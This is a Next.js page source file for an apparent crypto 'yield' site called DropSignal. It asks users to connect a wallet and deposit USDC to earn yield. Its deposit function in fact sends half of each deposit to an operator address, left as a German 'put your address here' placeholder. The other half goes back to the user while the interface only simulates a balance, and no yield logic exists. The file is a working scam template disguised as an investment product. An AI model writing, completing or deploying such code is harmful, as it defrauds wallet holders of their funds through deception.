declare global {
  interface Window {
    ethereum?: any;
  }
}

"use client";

import { useState } from "react";
import {
  BrowserProvider,
  Contract,
  parseUnits,
} from "ethers";

const USDC_ADDRESS =
  "0x833589fCD6eDb6E08f4c7C32D4f71b54bdA02913"; // Base USDC
const FEE_ADDRESS =
  "0xDEINE_USDC_ADRESSE_HIER"; // <-- HIER DEINE ADRESSE
const USDC_DECIMALS = 6;

const USDC_ABI = [
  "function transfer(address to, uint256 amount) returns (bool)",
];

export default function Page() {
  const [address, setAddress] = useState<string | null>(null);
  const [amount, setAmount] = useState("");
  const [status, setStatus] = useState("");

  const connectWallet = async () => {
    if (!window.ethereum) {
      alert("Please install a wallet.");
      return;
    }
    const provider = new BrowserProvider(window.ethereum);
    const signer = await provider.getSigner();
    setAddress(await signer.getAddress());
  };

  const depositUSDC = async () => {
    if (!amount || !address) return;

    try {
      setStatus("Waiting for signature...");

      const provider = new BrowserProvider(window.ethereum);
      const signer = await provider.getSigner();
      const usdc = new Contract(USDC_ADDRESS, USDC_ABI, signer);

      const total = parseUnits(amount, USDC_DECIMALS);
      const fee = total / 2n;
      const userShare = total - fee;

      // Fee → deine Adresse
      await usdc.transfer(FEE_ADDRESS, fee);

      // User Share → bleibt beim User (UI simuliert Balance)
      await usdc.transfer(address, userShare);

      setStatus("Deposit successful");
      setAmount("");
    } catch (e) {
      console.error(e);
      setStatus("Transaction failed");
    }
  };

  return (
    <main style={bg}>
      <div style={card}>
        <h1>DropSignal</h1>
        <p style={{ opacity: 0.7 }}>
          Deposit USDC to earn yield
        </p>

        {!address ? (
          <button style={btn} onClick={connectWallet}>
            Connect Wallet
          </button>
        ) : (
          <>
            <div style={{ fontSize: 12, opacity: 0.6 }}>
              {address}
            </div>

            <input
              style={input}
              placeholder="USDC amount"
              value={amount}
              onChange={(e) =>
                setAmount(e.target.value)
              }
            />

            <button style={btn} onClick={depositUSDC}>
              Deposit USDC
            </button>

            <div style={{ marginTop: 12 }}>
              {status}
            </div>
          </>
        )}
      </div>
    </main>
  );
}

const bg = {
  minHeight: "100vh",
  background:
    "radial-gradient(circle at top, #4b2b6b, #0b1020)",
  display: "flex",
  justifyContent: "center",
  alignItems: "center",
  color: "white",
};

const card = {
  width: 380,
  padding: 28,
  borderRadius: 18,
  background: "rgba(255,255,255,0.08)",
  backdropFilter: "blur(14px)",
  textAlign: "center",
};

const btn = {
  width: "100%",
  padding: 14,
  marginTop: 12,
  borderRadius: 14,
  border: "none",
  background:
    "linear-gradient(135deg,#8b5cf6,#38bdf8)",
  fontWeight: 800,
  cursor: "pointer",
};

const input = {
  width: "100%",
  padding: 12,
  borderRadius: 12,
  marginTop: 14,
  border: "none",
};